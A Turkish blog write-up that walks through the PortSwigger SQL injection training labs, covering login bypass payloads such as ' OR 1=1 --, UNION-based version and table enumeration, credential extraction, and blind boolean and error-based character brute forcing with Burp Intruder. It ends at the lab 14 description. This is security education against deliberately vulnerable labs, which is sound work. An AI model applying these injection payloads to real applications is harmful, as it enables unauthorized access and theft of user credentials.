SQL Injection — PortSwigger
===========================

### PortSwigger Labs - Write Up

![](https://cdn-images-1.medium.com/max/800/0*d0R3ZBNRPP4arYzO.png)

Herkese merhabalar, PortSwigger üzerinde SQL Injection başlıklı tüm lab’ları çözüp hepsine write-up yazmaya çalışacağım.

### 1\. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> **Lab açıklaması:**   
> Bu laboratuvar, ürün kategorisi filtresinde bir SQLi zafiyeti içeriyor. Kullanıcı bir kategori seçtiğinde uygulama aşağıdaki gibi bir SQL sorgusu gerçekleştirir:  
> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`   
> Laboratuvarı çözmek için uygulamanın bir veya daha fazla yayınlanmamış ürünü görüntülemesine neden olan bir SQL enjeksiyon saldırısı gerçekleştirin.

Lab’ı açtığımızda karşımıza e-ticaret sayfasına benzer bir ekran geliyor. Bazı kategoriler olduğunu görüyoruz “pets” gibi. Buna tıkladığımızda `GET /filter?category=Pets` şeklinde bir istek gidiyor. Bunun da SQL tarafında nasıl sorgulandığı lab açıklamasında verilmiş. Burada küçük bir deneme ile `category='+OR+1=1--` şeklinde sorgu girdiğimizde tırnağı kapatıp `YA DA` ifadesi ile doğru sonuç veren ve geri kalan sorgu kısmını `--` bu şekilde yorum satırına alarak bir istek atıyorum yayımlanmamış ürünleri görüntüleyebiliyoruz böylece lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 2\. Lab: SQL injection vulnerability allowing login bypass

> **Lab açıklaması:**  
> Bu laboratuvar, oturum açma işlevinde bir SQLi zafiyeti içeriyor. Laboratuvarı çözmek için uygulamada `administrator` kullanıcı olarak oturum açan bir SQL enjeksiyon saldırısı gerçekleştirin.

Lab’a girip my account sayfasına gittiğimizde giriş yapabileceğimiz kullanıcı adı ve parola sayfası geliyor. Burada ilk denediğim şey bir önceki lab’da olan sorguydu. Şifreyi girmemizi de zorunlu olarak istiyordu. `' OR 1=1 --` şeklinde kullanıcı adına bir sorgu girdim ve parola kısmına da rastgele değerler girdim. Bu şekilde admin olarak giriş yapabildim ama aslında `administrator'--` olarak da çözebilirdim. Burada bilinmesi gereken şey veritabanlarında ilk kullanıcı genelde admin, administrator, root gibi kullanıcılar oluyor. Eğer biz doğru bir şekilde giriş yaparsak ilk kullanıcı olarak giriş yapıyoruz bu yüzden çözümüm başarılı oldu. Farklı bir kullanıcı olarak giriş yapsaydım o zaman 2. gösterdiğim sorgu ile kullanıcı adını değiştirerek denemeliydim.

### 3\. Lab: SQL injection attack, querying the database type and version on Oracle

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQLi güvenlik açığı içeriyor. Enjekte edilen bir sorgunun sonuçlarını almak için UNION saldırısını kullanabilirsiniz. Laboratuvarı çözmek için veritabanı sürümünü görüntüleyin.  
> **Hint:**  
> Oracle veritabanlarında, her SELECT ifadesinin FROM’un seçileceği bir tablo belirtmesi gerekir. UNION SELECT saldırınız bir tablodan sorgulama yapmıyorsa, yine de FROM anahtar sözcüğünü ve ardından geçerli bir tablo adını eklemeniz gerekecektir. Oracle’da bu amaçla kullanabileceğiniz **dual** adında bir tablo bulunmaktadır. Örneğin: UNION SELECT ‘abc’ FROM dual

Lab açıklamasında bize UNION tabanlı SQLi türü olduğunu belirtmiş. Burada bilinmesi gereken şey UNION sorgusunun **_en az_** 2 tablo arasında yapılması. Bu durumda kaç tane tablo olduğunu tespit etmek için 2 farklı değer girip bize bilgisi verilen `dual` adlı tablodan sorgu yapıyorum.

![](https://cdn-images-1.medium.com/max/800/1*vrc0DZrkrIwEvh8v9Zt4og.png)

Bu durumda 2 tablo olduğunu tespit etmiş oldum. Bizden istenen Oracle veritabanının version bilgisini elde etmek. Oracle’da version bilgisi `v$version` şeklinde sorgulanıyor. Bilinmesi gereken diğer bir husus ise versiyon bilgileri gibi yazılım sürüm ve detaylarını içeren sütun adının `banner` olması. **_SELECT banner FROM v$version_** şeklinde sorgu yaptığımızda veritabanı versiyonuna erişebiliriz. Bu durumda sadece **_‘bey’_** olan kısmı **_BANNER_** olarak değiştirdiğimde istediğimi elde edebileceğim.

![](https://cdn-images-1.medium.com/max/800/1*Y5FzDQnjT5HYN3fkmF6Faw.png)

Böylelikle lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 4\. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

> **Lab açıklaması:**  
Bu laboratuvar, ürün kategorisi filtresinde bir SQLi güvenlik açığı içeriyor. Enjekte edilen bir sorgunun sonuçlarını almak için UNION saldırısını kullanabilirsiniz. Laboratuvarı çözmek için veritabanı sürümünü görüntüleyin.

Burada bir önceki lab gibi UNION tabanlı SQLi olduğu belirtiliyor ve bu sefer MySQL ve Microsoft veritabanı version bilgisini almamız isteniyor. Burada önce `category=Gifts'UNION+SELECT+'bey','za'#` şeklinde bir sorgu yaptım fakat 500 döndü. Sütun sayısının daha fazla olabileceğini düşündüm ve `category=Gifts'UNION+SELECT+'bey','za','test'#` şeklinde bir sorgu yaptım ve 200 döndü bu durumda 3 tane sütun sayısı olduğunu tespit etmiş oldum **_(UNION tabanlı saldırıda önemli olan, sorguların aynı sayıda sütun döndürmesi gerektiğidir)_**. Artık version bilgisini sorgulayabilirim. `@@version` şeklinde sorgulanıyor.

![](https://cdn-images-1.medium.com/max/800/1*Mdtxf3gYamTlBnRoVvrd3A.png)

Böylece lab’ı başarılı bir şekilde çözmüş olduk.

### 5\. Lab: SQL injection attack, listing the database contents on non-Oracle databases

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQLi güvenlik açığı içeriyor. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz.  
> Uygulamanın bir oturum açma işlevi vardır ve veritabanı, kullanıcı adlarını ve parolaları tutan bir tablo içerir. Bu tablonun adını ve içerdiği sütunları belirlemeniz, ardından tablonun içeriğini alarak tüm kullanıcıların kullanıcı adı ve şifresini almanız gerekir.  
> Laboratuvarı çözmek için **administrator** kullanıcı olarak oturum açın.

Burada yine ürün kategorilerinde UNION tabanlı bir zafiyet olduğu belirtilmiş. İlk olarak ürün kısmında yakaladığım bir isteği

![](https://cdn-images-1.medium.com/max/800/1*ulfuptQ99BohBaIyBIW9-g.png)

sorgusuyla kaç tane sütun olduğunu tespit etmek için kullanıyorum ve

![](https://cdn-images-1.medium.com/max/800/1*GBM-RstXYMBuOhBQty36mw.png)

başarılı oluyorum. Bizden kullanıcı adı ve parolaları içeren bir tabloyu bulmamızı sonrasında da bu tablonun içeriğini almamızı istiyor. Tablonun adını `information_schema.tables` şeklinde sorgulama yaparak bulabiliriz. Bu bilgiye [buradan](https://portswigger.net/web-security/sql-injection/cheat-sheet) ulaşabiliriz.

![](https://cdn-images-1.medium.com/max/800/1*Don0LTdxuDtH_vSNaGLBGQ.png)

Bu şekilde sorgu yaptıktan sonra 200 aldım ve başarılı oldum. Site üzerinde daha net bir şekilde görürüz.

![](https://cdn-images-1.medium.com/max/800/1*4SMna3akNKBU7w0R6jAj-Q.png)

Bu şekilde tablo isimlerinin geldiğini gördük. Kullanıcı tablolarının `users_puhbvu` olduğunu görüyorum aynı zamanda tablo isimlerinin başında `pg` olduğu için PostgreSQL veritabanı olduğunu da tespit etmiş oluyorum yani sorgularımı buna göre yapabilirim ama bu lab özelinde gerekli değil.

![](https://cdn-images-1.medium.com/max/800/1*2PdgJsedpKg8GvRVIN3bFw.png)

Burada sütun isimlerini de `users_puhbvu` tablosundan çekip sonuçlarına bakıyorum ve

![](https://cdn-images-1.medium.com/max/800/1*XoZdxkujzejhlGTit94cjQ.png)

kullanıcı adlarının `username_agzpor`, parolaların ise `password_bmwwmg` olduğunu tespit ediyorum. Artık kullanıcı adı ve parolaları çekebilirim.

![](https://cdn-images-1.medium.com/max/800/1*bYYnid3N0C3mlltfd3zwSg.png)

Bu sorgu ile başarılı bir şekilde kullanıcı adı ve parolaları görüntüledik. Lab’ı çözmek için **administrator** olarak giriş yapmamız isteniyor.

![](https://cdn-images-1.medium.com/max/800/1*lYohBsgweUIqrzIMtbqNVg.png)

Elde ettiğimiz bilgilerle giriş yaptığımızda lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 6\. Lab: SQL injection attack, listing the database contents on Oracle

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQLi güvenlik açığı içeriyor. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz. Uygulamanın bir oturum açma işlevi vardır ve veritabanı, kullanıcı adlarını ve parolaları tutan bir tablo içerir. Bu tablonun adını ve içerdiği sütunları belirlemeniz, ardından tablonun içeriğini alarak tüm kullanıcıların kullanıcı adı ve şifresini almanız gerekir. Laboratuvarı çözmek için yönetici kullanıcı olarak oturum açın.  
> **Hint:**  
> Oracle veritabanlarında, her SELECT ifadesinin FROM’un seçileceği bir tablo belirtmesi gerekir. UNION SELECT saldırınız bir tablodan sorgulama yapmıyorsa, yine de FROM anahtar sözcüğünü ve ardından geçerli bir tablo adını eklemeniz gerekecektir.  
> Oracle’da bu amaçla kullanabileceğiniz **dual** adında yerleşik bir tablo bulunmaktadır. Örneğin: UNION SELECT ‘abc’ FROM dual

Bu lab’da da bir önceki lab ile aynı şeyleri istiyor tek fark veritabanının Oracle olması. Burada tablo adını verdiği için şöyle bir sorgu deniyorum

![](https://cdn-images-1.medium.com/max/800/1*gWLFQPvrSfwNa2PSARjcBQ.png)

böylece sütun sayısını tespit etmiş oldum. Şimdi tablo adlarını bulmam gerekecek.

![](https://cdn-images-1.medium.com/max/800/1*DoOipVHSvEJNBb0i8pSZ8g.png)

Bu sorgu ile tablo isimlerine erişmiş oldum ve users tablosunun `users_qdgffk` olduğunu tespit ettim. Şimdi de sütunları bulmam gerekecek.

![](https://cdn-images-1.medium.com/max/800/1*Mvpu2EzA9ofgW_0YeHfimg.png)

Bu sorgu ile tüm sütunlara eriştim ve kullanıcı adlarının `username_cbndxs` parolaların da `password_vpfjuo` olarak tutulduğunu tespit ettim.

![](https://cdn-images-1.medium.com/max/800/1*ZtSWubAwa3u3-EbqwxA4Gw.png)

Bu sorguyla kullanıcı adı ve şifrelere erişmiş oldum artık administrator olarak giriş yaptığımda lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 7\. Lab: SQL injection UNION attack, determining the number of columns returned by the query

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQL ekleme güvenlik açığı içeriyor. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz. Böyle bir saldırının ilk adımı, sorgunun döndürdüğü sütun sayısını belirlemektir. Daha sonra bu tekniği sonraki laboratuvarlarda tam saldırıyı oluşturmak için kullanacaksınız. Laboratuvarı çözmek için, boş değerler içeren ek bir satır döndüren bir SQL enjeksiyon UNION saldırısı gerçekleştirerek sorgunun döndürdüğü sütun sayısını belirleyin.

UNION tabanlı bir SQLi saldırısında sorgunun **_kaç sütundan oluştuğu ve sorgudan dönen sütunların uygun veri türünde olması önemli_**dir. Bu durumda kaç sütundan oluştuğunu bulmak için önce 2 tane null değer gönderdim fakat olmadı ardından 3 tane gönderdim

![](https://cdn-images-1.medium.com/max/800/1*REpzxloLOyiS8sRDMad76g.png)

200 döndü ve böylece lab’ı başarılı bir şekilde çözmüş olduk.

### 8\. Lab: SQL injection UNION attack, finding a column containing text

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQL ekleme güvenlik açığı içeriyor. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz. Böyle bir saldırı oluşturmak için öncelikle sorgunun döndürdüğü sütun sayısını belirlemeniz gerekir. Bunu daha önceki bir laboratuvarda öğrendiğiniz bir tekniği kullanarak yapabilirsiniz. Bir sonraki adım, dize verileriyle uyumlu bir sütun tanımlamaktır. Laboratuvar, sorgu sonuçlarında görünmesini sağlamanız gereken rastgele bir değer sağlayacaktır. Laboratuvarı çözmek için, sağlanan değeri içeren ek bir satır döndüren bir SQL enjeksiyon UNION saldırısı gerçekleştirin. Bu teknik, hangi sütunların **‘string’** verileriyle uyumlu olduğunu belirlemenize yardımcı olur.

Lab açıklamasında da belirttiği gibi bir önceki lab’da öğrendiğimiz yöntemi kullanarak kaç sütun olduğunu bulmamız gerekiyor. Ben de

![](https://cdn-images-1.medium.com/max/800/1*wCOBAnl7_W_pSVKxsboj7Q.png)

böyle bir sorgu yaparak 3 sütundan oluştuğunu tespit ettim. Ardından yine bir önceki lab’da sütun sayısının yanı sıra veri türlerinin de önemli olduğunu söylemiştim. Burada da hangi sütunun string ile uyumlu olduğunu tespit etmek için her bir null değerini tek tek string ile değiştirip deniyorum.

![](https://cdn-images-1.medium.com/max/800/1*7eouUpvhAHLNV7CeflbCOQ.png)

Yukarıda gördüğünüz sorguda alt kısma yazdığım ilk null değerini ‘beyza’ ile değiştirdim ve 500 aldım. Sonrasında 2. null değerini değiştirdiğimde 200 sonucunu aldım ve başarılı oldum yani 2. sütun string ile uyumlu olduğunu tespit ettim. Sayfanın en üst kısmında

![](https://cdn-images-1.medium.com/max/800/1*d2fCCSB1FqK6MEXYbB3ffg.png)

bu şekilde bir bilgi verilmiş. Sorguda ‘beyza’ olarak belirttiğim stringi verilen bilgideki değerle değiştirdiğimde lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 9\. Lab: SQL injection UNION attack, retrieving data from other tables

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQL ekleme güvenlik açığı içeriyor. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz. Böyle bir saldırı oluşturmak için önceki laboratuvarlarda öğrendiğiniz bazı teknikleri birleştirmeniz gerekir. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, `users` adı verilen farklı bir tablo içerir. Laboratuvarı çözmek için, tüm kullanıcı adlarını ve şifreleri alan bir SQL enjeksiyon UNION saldırısı gerçekleştirin ve bu bilgileri **administrator** kullanıcı olarak oturum açmak için kullanın.

Önceki lab’larda yaptığım gibi 2 tane null göndererek

![](https://cdn-images-1.medium.com/max/800/1*fxrAwNrkcvhRhVwM5SPCeg.png)

sütun tespiti yapmış oldum. Ardından 2 değeri de string değerlerle değiştirip uyumlu olup olmadıklarını kontrol ettim.

![](https://cdn-images-1.medium.com/max/800/1*kdtfECqfGdJRMuDW7Rjyqg.png)

200 sonucu aldıktan sonra tablo isimlerini tespit etmem gerekiyordu ve aşağıdaki sorguyu yazdım.

![](https://cdn-images-1.medium.com/max/800/1*D2cKeYbSBYHNBpixZNfrnw.png)

Burada `users` adlı tabloyu buldum. Artık kullanıcı adı ve parola sütunları çekebilirim.

![](https://cdn-images-1.medium.com/max/800/1*tzjjLR7-SGVPVt4z72uKFg.png)

Bu sorgu ile sütun adlarını tespit ettim. Şimdi de kullanıcı adı ve parola verilerini görmeliyim.

![](https://cdn-images-1.medium.com/max/800/1*_2l2baUQsy-SbsYikfXHMw.png)

Artık administrator olarak giriş yapabiliriz ve lab’ı başarılı bir şekilde çözmüş olduk.

### 10\. Lab: SQL injection UNION attack, retrieving multiple values in a single column

> **Lab açıklaması:**  
> Bu laboratuvar, ürün kategorisi filtresinde bir SQL ekleme güvenlik açığı içeriyor. Sorgunun sonuçları uygulamanın yanıtında döndürülür, böylece diğer tablolardan veri almak için UNION saldırısını kullanabilirsiniz. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, `_users_` adı verilen farklı bir tablo içerir. Laboratuvarı çözmek için, tüm kullanıcı adlarını ve şifreleri alan bir SQL enjeksiyon UNION saldırısı gerçekleştirin ve bu bilgileri **administrator** kullanıcı olarak oturum açmak için kullanın.

Bu lab’da tek 1 sütunda değerleri alabileceğimizden bahsediyor. Yani aslında 2 sütundaki veriyi tek 1 sütunda birleştirmemiz gerekiyor. Bunu mesela Oracle’da `||` 2 tane pipe ifadesi ile yapabiliriz.

Önce 2 tane null atarak 2 sütun olduğundan emin oldum. Ardından hangisinin string ile uyumlu olduğuna bakmak için deneme yaptım.

![](https://cdn-images-1.medium.com/max/800/1*h5xJ6H6wz1JN2iRcEbV92Q.png)

2\. sütunun uyumlu olduğunu da bu şekilde tespit etmiş oldum yani kullanıcı adı ve parola verilerini 2. sütunda birleştireceğim. `users` tablosu verilmiş fakat yine de

![](https://cdn-images-1.medium.com/max/800/1*wCk8rj83Fbw_72l0i_Zwjw.png)

bu şekilde bir sorguyla tablo isimlerine ulaşabiliriz şayet vermemiş olsalardı böyle ulaşırdık. Şimdi ise sütun isimlerine ulaşmamız gerekecek. Fakat yine de birleştirme işlemi yapacağımız için veritabanı tipini öğrenip ona göre bir sorgu yazmamız gerekecek. Bu yüzden tablo isimlerinin prefix’indeki `pg` ifadesinden PostgreSQL için sorgu yazacağımızı anlayabiliriz. Önceki lab’larda aşağıdaki gibi

![](https://cdn-images-1.medium.com/max/800/1*hZJOgBu5WZ6xg3Asu4Qcsg.png)

sütun ismiyle ulaşabiliyorduk fakat tek 1 sütun kullanabildiğimiz için birleştirmemiz gerekecek.

![](https://cdn-images-1.medium.com/max/800/1*8g_BwjKOytPn1_Crvx3NJw.png)

Burada `||` ifadesi ile username ve password sütunlarını birleştiriyoruz fakat arada `':'` yer alıyor o da 2 string’i birbirinden ayırmak için kullandığımız bir ifade. Dilerseniz onun yerine `'-'` ya da `'~'` gibi ifadeler kullanabilirsiniz. Sonuç olarak administrator kullanıcısının şifresini tespit ettik ve giriş yaparak lab’ı başarılı bir şekilde çözmüş olduk.

### 11\. Lab: Blind SQL injection with conditional responses

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusunun sonuçları döndürülmez ve hiçbir hata mesajı görüntülenmez. Ancak sorgunun herhangi bir satır döndürmesi durumunda uygulama, sayfada bir Hoş Geldiniz mesajı içerir. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, `users` adı verilen farklı bir tablo içerir. **administrator** kullanıcının şifresini bulmak için blind SQLi güvenlik açığından yararlanmanız gerekir. Laboratuvarı çözmek için **administrator** kullanıcı olarak oturum açın.  
> **Hint:**  
> Parolanın yalnızca küçük harf, alfasayısal karakterler içerdiğini varsayabilirsiniz.

Bu lab özelinde bilinmesi gereken şey blind SQLi türünün sorgudan sonra herhangi bir yanıt dönmemesidir. Adı üstünde kör yani sorgudan sonra bir şey görmüyoruz. Bunun yanı sıra lab açıklamasında Tracking Cookie’den bahsedilmiş. TrackingId şeklinde cookie içinde gelen bu değeri **_uygulama, bilinen bir kullanıcı olup olmadığını belirlemek için_** **_kullanıyor._** Eğer bilinen bir kullanıcıysa, sorgu veri döndürüyor ve **_“Welcome back”_** şeklinde bir değer dönüyor. Bu da blind SQLi sömürmek için bize yeter. Bu lab’da koşullu olarak farklı yanıtları tetikleyerek bilgi alabiliriz.

Öncelikle lab’a girip herhangi bir kategoriye bastığımızda giden isteği Burp ile yakalayıp inceliyorum. Burada cookie içinde bir TrackingId değeri veriliyor. Bu değer üzerinde koşullu ifadelerle sorgular yapıp “welcome back” mesajının doğrulanıp doğrulanmadığını tespit etmeye çalışalım.

![](https://cdn-images-1.medium.com/max/800/1*e4jKJIoqE0-kef9EzrnKHg.png)

Burada doğru sonuç veren bir sorgu yazdım ve “welcome back” mesajını görüntüledim. Şimdi de yanlış bir sorgu yazıp bu mesajı görüntülemediğimden emin olmak istiyorum.

![](https://cdn-images-1.medium.com/max/800/1*MBgZh0NrZChuCMySaePuuw.png)

Sonuç vermedi ve emin oldum. Bu da artık doğru sonuç verecek sorgular yaparak bir şeyleri doğrulayarak ilerleyebileceğimi ifade ediyor. Artık users adında bir tablonun varlığını doğrulayabilirim. Eğer doğruysa “welcome back” mesajını alacağım.

![](https://cdn-images-1.medium.com/max/800/1*YuQkv-3LEV8X3d0NHaNO2Q.png)

Buradaki sorguyla users tablosunu doğrulamış oldum. Şimdi de administrator adında bir kullanıcı var mı yok mu onu doğrulamak istiyorum.

![](https://cdn-images-1.medium.com/max/800/1*9bFr7l16hdpiGrD_qM2FEg.png)

Bu sorguyla birlikte “welcome back” mesajını aldım ve administrator kullanıcısını da doğrulamış oldum. Artık şifresini bulmam gereken sorgular yazmalıyım.

![](https://cdn-images-1.medium.com/max/800/1*czwbaCln5da09qSxka2MuQ.png)

Bu sorgu ve aldığım mesajla birlikte parolanın 5 karakterden büyük olduğuna da emin olmuş oldum. Fakat bir önceki lablara dayanarak şifrenin 20 karakterden oluştuğunu düşünüyorum. Emin olmak için önce 15 sonra 20 sonra da 25 denemelerini yapacağım. 15 yaptığımda mesajı aldım ama 20 yaptığımda almadım bu yüzden 25 denememe gerek kalmadı çünkü şifrenin uzunluğu 15–20 karakter arasında olmalı. Ancak 20 karakterden uzun mu diye baktım eşit de olabilir.. Bu yüzden sorguyu `>=` olarak değiştirdiğimde tam olarak 20 karakterli olduğuna emin oldum. Artık şifrenin her karakterini brute force ile deneme yaparak tespit etmeliyiz. Bu yüzden isteği Intruder’a gönderiyorum. Burada attack tipi olarak simple list seçiyorum ve a-z ile 0–9 arasındaki tüm karakterleri payload olarak giriyorum toplam 36 tane payload olması lazım. Her karakter için tek tek deneyeceğiz maalesef. İsterseniz turbo intruder’a bir kod yazın..

![](https://cdn-images-1.medium.com/max/800/1*necQn64H2N1aN9fsbraRVA.png)

Bu şekilde **_‘beyza_** kısmını işaretledim çünkü oradaki karakteri kontrol edecek isterseniz tek bir karakter de girebilirsiniz. Artık saldırıyı başlatabiliriz. Her bittiğinde **_password, 1, 1_** kısmındaki karakteri değiştirip **_password, 2, 1_** gibi 20. karaktere kadar tekrar tekrar saldırı yaparak şifreyi keşfedeceğiz. Şifreyi bulup administrator olarak giriş yaptığımızda lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 12\. Lab: Blind SQL injection with conditional errors

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusunun sonuçları döndürülmez ve uygulama, sorgunun satır döndürüp döndürmemesine bağlı olarak farklı yanıt vermez. SQL sorgusu bir hataya neden olursa uygulama özel bir hata mesajı döndürür. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, `_users_` adı verilen farklı bir tablo içerir. **administrator** kullanıcının şifresini bulmak için blind SQLi güvenlik açığından yararlanmanız gerekir. Laboratuvarı çözmek için **administrator** kullanıcı olarak oturum açın.  
> **Hint:**  
> Bu laboratuvar bir Oracle veritabanı kullanıyor.

Bu lab’da da bir önceki lab’da olduğu gibi bir tracking cookie verilmiş. Aynı zamanda bir hata mesajının alınacağına dair de elimizde bilgi var. Önce sorgu deneyerek hata almaya çalışalım.

![](https://cdn-images-1.medium.com/max/800/1*kgrda7DWGZDoqD4-_0MlVw.png)

Burada 1 tane tırnak koyduğum için hata verdi. Şimdi 2 tırnak deneyip eğer hata vermezse az önceki hatanın buradaki sorgudan kaynaklı syntax hatası olup olmadığına emin olacağım.

![](https://cdn-images-1.medium.com/max/800/1*_jTC2OxdW9_Ayxqody3cKA.png)

Hata almadığıma göre demek ki buradaki sorgudan kaynaklıymış diyebiliyorum artık. Bize ipucu kısmında Oracle veritabanı olduğundan bahsetmiş bu yüzden dual tablosunu deneyerek bir alt sorgu yazmaya çalışacağım.

![](https://cdn-images-1.medium.com/max/800/1*VNnK_9QscJjn2IaSjJmLew.png)

Burada yine bir hata almadım. Bir de şu şekilde

![](https://cdn-images-1.medium.com/max/800/1*bkzAkeiqPh0VADu54vBbKw.png)

denedim fakat hata aldım demek ki tablo adı yazmamız gerekiyor illaki bunu da anlamış oldum. Çünkü geçersiz bir tablo adı girdiğimde de hata alıyorum herhangi bir şey giremiyorum o yüzden bunu vurguladım aslında. Şimdi de bize bilgisi verilen users tablosunun varlığından emin olmak için

![](https://cdn-images-1.medium.com/max/800/1*BmA4Oyd17db32JCOdceEKA.png)

şu şekilde bir sorgu yapıyorum ve başarılı oluyor. Şimdi de koşul belirterek bir test yapmam gerekiyor ki hata mesajı alıp almadığımı görebilmeliyim.

![](https://cdn-images-1.medium.com/max/800/1*MuKKOnirNbpNgraWSPBTWQ.png)

`CASE` olarak belirttiğim kısım koşulu test ediyor. Eğer doğruysa bir ifadeyi yanlışsa başka bir ifadeyi değerlendiriyor. Benim yazdığımda hataya sebep olan sıfıra bölme işlemiydi. Bu durumda 1=1 ve 1=2 koşullarını test edip koşul doğru olduğunda hata almamız gerekiyor. Yukarıdaki sorguda 1=2 koşulu yanlış olduğu için hata vermedi. Şimdi de 1=1 koşulunu test edeceğim ve hata alıp almadığıma bakacağım.

![](https://cdn-images-1.medium.com/max/800/1*1t4lxNWA9UyIqbIHFOB-wg.png)

Koşul doğru olduğu için hata aldım. Artık bir şeylerin doğru olup olmadığını test etmek için bunu kullanabilirim. Lab’ı çözmek için administrator kullanıcısı olarak giriş yapmamız istendiğinden bu kullanıcının varlığını kontrol edeceğim.

![](https://cdn-images-1.medium.com/max/800/1*BnWKuErRMh0K73Dy3AcG5Q.png)

Hata aldığıma göre böyle bir kullanıcı var diyebiliyorum artık. Şimdi de yine bir önceki lab’da olduğu gibi bu kullanıcının şifresinin kaç karakter olduğunu bulmam gerekiyor.

![](https://cdn-images-1.medium.com/max/800/1*107an8UAjy50Peqb6VfgXg.png)

Diğer lab’larda administrator kullanıcısının şifresi 20 karakter olduğu için vakit kaybetmemek adına direkt olarak `>=20` denedim ve hata aldım. Yani 20 karakter olduğuna eminim artık. 11. lab’da yaptığımız gibi şifrenin karakterlerini tek tek tespit etmemiz gerekiyor. Bu yüzden isteği aşağıdaki gibi düzenleyip

![](https://cdn-images-1.medium.com/max/800/1*JdmFrVNzPLbSPAdenuwpHg.png)

intruder’a gönderiyorum. Burada yine tek tek şifrenin her karakterini tespit edeceğim. Bu yüzden bir önceki lab’da yaptıklarımı yaparak 20 kez saldırı yapacağım. Sonrasında tespit ettiğimiz şifreyle administrator kullanıcısına giriş yapıyorum ve lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 13\. Lab: Visible error-based SQL injection

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusunun sonuçları döndürülmez. Veritabanı, kullanıcı adı ve parola adı verilen sütunlara sahip, users adı verilen farklı bir tablo içerir. Laboratuvarı çözmek için `administrator` kullanıcının şifresini sızdırmanın bir yolunu bulun ve ardından hesabında oturum açın.

Lab, blind SQLi içerip bunun görünür olabileceğine dair adından bize bilgi veriyor. Ben de tracking id değerine tek tırnak atıp isteği gönderiyorum ve

![](https://cdn-images-1.medium.com/max/800/1*HIBn0GFYGc-PbGvQ8m805A.png)

bayağı ayrıntılı bir mesaj veriyor hatta buna tracking id değeri de dahil. O halde tek tırnak ve yorum satırı deneyebilirim.

![](https://cdn-images-1.medium.com/max/800/1*2z93HVVXWVwdYf4zLBOUiA.png)

200 döndüğüne göre syntax olarak geçerli bir sorgu yaptığımı doğrulamış oldum. Genelde buradaki veriler string oluyor o yüzden int tipine cast etmeye çalışacağım daha fazla detaylı hata vermesini umarak.

![](https://cdn-images-1.medium.com/max/800/1*xdtmJGCg7sFoLQ-exiaX3Q.png)

Burada `AND` olarak belirttiğim koşulun boolean tipinde olması gerektiğine dair güzel bir hata veriyor.

![](https://cdn-images-1.medium.com/max/800/1*I37EggcWdZ2cuSuuo5HL_g.png)

Yukarıda sorguyu, 1'e eşit olacak şekilde değiştiriyorum ve 200 dönüyor yani geçerli bir sorgu yapmış olduğumu anlıyorum. Şimdi veritabanından kullanıcı adlarını almaya çalışacağım.

![](https://cdn-images-1.medium.com/max/800/1*aYJW9tUNXrdrmAdkJVpplg.png)

Burada ilk hata mesajını tekrar aldığımı farkettim fakat birden fazla satır döndürdüğü için bir hata aldım bu yüzden tek satır olacak şekilde sorguyu değiştireceğim.

![](https://cdn-images-1.medium.com/max/800/1*Sdm49dEZZuNGMbFWXqdJ9w.png)

Sorguda tek satırla sınırladığım için ilk kullanıcının adını leak etmiş oldu. Şimdi sadece username yerine password yazarak parolayı alacağım. Aldıktan sonra hesaba giriş yapıyoruz ve lab’ı başarılı bir şekilde çözmüş oluyoruz.

### 14\. Lab: Blind SQL injection with time delays

> **Lab açıklaması:**  
> Bu laboratuvar blind SQLi güvenlik açığı içeriyor. Uygulama, analiz için bir tracking çerezi kullanır ve gönderilen çerezin değerini içeren bir SQL sorgusu gerçekleştirir. SQL sorgusunun sonuçları döndürülmez ve uygulama, sorgunun satır döndürmesine veya hataya neden olmasına bağlı olarak farklı yanıt vermez. Ancak sorgu senkronize olarak yürütüldüğünden, bilgi çıkarmak için koşullu zaman gecikmelerini tetiklemek mümkündür. Laboratuvarı çözmek için SQL enjeksiyon güvenlik açığından yararlanarak 10 saniyelik bir gecikmeye neden olun.

